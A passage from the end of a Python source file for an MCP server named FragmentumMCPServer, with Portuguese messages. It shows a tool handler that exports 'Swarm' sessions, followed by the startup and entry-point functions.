            session_id = args["session_id"]
            
            if not hasattr(self, '_swarm_controllers'):
                return "Nenhuma sessão Swarm encontrada"
            
            for controller in self._swarm_controllers.values():
                session = controller.get_session(session_id)
                if session:
                    return controller.export_session(session_id)
            
            return f"Sessão não encontrada: {session_id}"
        
        else:
            return f"Ferramenta não encontrada: {name}"
    
    async def run(self):
        """Inicia o servidor MCP"""
        async with stdio_server() as (read_stream, write_stream):
            await self.server.run(
                read_stream,
                write_stream,
                self.server.create_initialization_options()
            )


async def start_server():
    """Inicia servidor MCP"""
    server = FragmentumMCPServer()
    await server.run()


def create_mcp_server():
    """Cria e retorna instância do servidor MCP"""
    if not HAS_MCP:
        raise ImportError("MCP não instalado. Execute: pip install mcp")
    
    mcp_server = FragmentumMCPServer()
    return mcp_server.server


def main():
    """Entry point"""
    if not HAS_MCP:
        print("Erro: MCP não instalado")
        print("Execute: pip install mcp")
        sys.exit(1)
    
    asyncio.run(start_server())


if __name__ == "__main__":
    main()
